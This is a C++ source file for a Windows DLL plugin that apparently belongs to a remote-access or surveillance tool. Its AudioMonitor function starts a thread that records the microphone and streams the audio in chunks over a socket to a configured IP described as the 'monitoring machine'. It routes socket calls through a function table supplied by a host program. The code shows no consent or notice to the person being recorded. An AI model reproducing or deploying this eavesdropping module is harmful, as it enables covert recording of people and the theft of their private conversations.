// screen.cpp : Defines the entry point for the DLL application.
//
#include "conn.h"
#include "macro.h"
#include "svrdll.h"
#include "AudioMgr.h"
#include "Audio.h"

#include <time.h>
#include <windows.h>
#include <process.h>
#include <tlhelp32.h>

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
    }
    return TRUE;
}


class HelpClass
{
public:
	HelpClass(){}
	~HelpClass(){}

	DECLARE_DLLINFO_MAP()
};

BEGIN_DLLINFO_MAP(HelpClass)
	ADD_DLLINFO_ENTRY(CONTROL_AUDIO_INIT, 0, "AudioMonitor")
	ADD_DLLINFO_ENTRY(CONTROL_AUDIO_CLOSE, 0, "AudioDestroy")
END_DLLINFO_MAP()

const dll_info* GetDllFuncs()
{
	return HelpClass::GetInfos();
}

int GetDllFuncCnt()
{
	return HelpClass::GetInfoCnt();
}

static CAudio	*m_lpAudio;
static HANDLE	m_hWorkThread;
static bool m_bIsWorking = false;

static char ip[16];
static int conn_port;
static int conn_type;

sock_funcs *gFuncs;

int OnInitialize(void *p)
{
	union client_cfg* cfg= (union client_cfg*)p;
	
	strcpy(ip, cfg->cfg1.clientIP);
	conn_port = cfg->cfg1.port;
	conn_type = cfg->cfg1.conn_type;
	gFuncs = (sock_funcs *)(cfg->cfg1.reserved);

	return 0;
}


static unsigned int __stdcall audioThread(void* p)
{
	if(gFuncs == NULL)	return NULL;
	
	const int MAX_PACKAGE = 10240;
	unsigned char task = 'A';
	int nStatus = 0, nWrite;
	conn ftpfd = gFuncs->mySocket(conn_type);
	if(ftpfd == NULL)	{	nStatus =  ERR_FAILCONN; goto leave;}

	struct sockaddr_in servaddr;
	servaddr.sin_port = gFuncs->myHtons(conn_port);
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = gFuncs->myInet_addr(ip);

	//连接监控机器
	if(gFuncs->myConnect(ftpfd, (const sockaddr*)&servaddr, sizeof(servaddr)) < 0)
	{	nStatus =  ERR_FAILCONN; goto leave;}
	
	//立马发送一个标记，提醒注意这是一个声音请求
	control_header feedBack;
	gFuncs->myWrite(ftpfd, NULL, (char*)&task, sizeof(task));
	gFuncs->myRead(ftpfd, (char*)&feedBack, sizeof(feedBack), 0, NULL); 
	
	while (1)
	{
		if(!m_bIsWorking) break;
		
		control_header header = INITIALIZE_COMPRESS_HEADER(CONTROL_AUDIO_DATA);
		DWORD	dwBytes = 0;
		LPBYTE	data = m_lpAudio->getRecordBuffer(&dwBytes);
		printf("%s %d\n", "audioBytes", dwBytes);
		if (data == NULL)	continue;

		int offset = 0, one_len = MAX_PACKAGE;
		do
		{
			if(offset + one_len > dwBytes)
				one_len = dwBytes - offset;

			header.seq++;
			header.dataLen = one_len;

			nWrite = 0;
			nWrite = gFuncs->myWrite(ftpfd, &header, (char*)data+offset, one_len);
			if(nWrite < 0)	{nStatus =  gFuncs->myError;goto leave;}
			offset += one_len;

		}while(offset < dwBytes);

		header.dataLen = -1;
		gFuncs->myWrite(ftpfd, &header, NULL, -1);

		printf("%s %d\n", "audioData", header.seq);
	}

leave:
	//printf("Leave %s %d\n", __FUNCTION__, nStatus);

	m_bIsWorking = false;
	gFuncs->myClose(ftpfd);
	return NULL;
}


int AudioMonitor(conn s, char* buf, int n, writeToClient fn)
{
	control_header header = INITIALIZE_HEADER(CONTROL_AUDIO_INIT);
	int nStatus = 0;

	if(m_bIsWorking)
	{
		nStatus = ERR_EXIST;
		goto leave;
	}

	if (!waveInGetNumDevs())
	{
		nStatus = ERR_NOTFIND;
		goto leave;
	}

	m_lpAudio = new CAudio;
	m_bIsWorking = true;

	//开启线程
	unsigned threadID;
	m_bIsWorking = true;
	if((m_hWorkThread = (HANDLE)_beginthreadex(NULL, 0, audioThread, NULL, 0, &threadID) ) == NULL)
		nStatus = ERR_FAILJOB;
leave:
	header.response = nStatus;
	if(fn)	fn(s, &header, NULL, 0);
	return nStatus;
	
	return 0;
}

int AudioDestroy(conn s, char* buf, int n, writeToClient fn)
{
	control_header header = INITIALIZE_HEADER(CONTROL_AUDIO_CLOSE);
	int nStatus = 0;
	
	//printf("%s %d\n", __FUNCTION__, m_bIsWorking);
	if(m_bIsWorking == false)	goto leave;

	m_bIsWorking = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);

leave:
	header.response = nStatus;
	if(fn)	fn(s, &header, NULL, 0);
	return nStatus;
	return 0;
}